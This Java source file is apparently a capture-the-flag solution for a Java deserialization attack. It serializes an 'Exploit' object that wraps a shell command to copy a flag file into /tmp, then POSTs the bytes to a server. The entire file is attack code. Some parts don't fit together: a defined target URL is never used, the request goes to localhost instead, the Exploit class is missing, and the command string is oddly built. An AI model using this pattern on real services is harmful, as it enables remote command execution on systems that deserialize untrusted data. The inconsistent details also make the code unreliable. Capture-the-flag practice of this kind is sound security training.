package ctf.jargon;
import java.io.*;
import java.net.*;

public class Main {
    public static void main(String[] args) {
        try {
            String targetUrl = "http://[redacted]:30942/contact";
            String command = "sh -c $@|sh . echo cat /flag-butlocationhastobesecret-1942e3.txt > /tmp/poc"; 
            
            
            Exploit exploit = new Exploit(command);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(exploit);
            oos.close();
            
            byte[] serializedData = baos.toByteArray();
            
            
            URL url = new URL("http://127.0.0.1:8080/");

            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/octet-stream");
            conn.setDoOutput(true);
            
            
            OutputStream os = conn.getOutputStream();
            os.write(serializedData);
            os.flush();
            os.close();
            
            
            BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String line;
            while ((line = br.readLine()) != null) {
                System.out.println(line);
            }
            br.close();
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
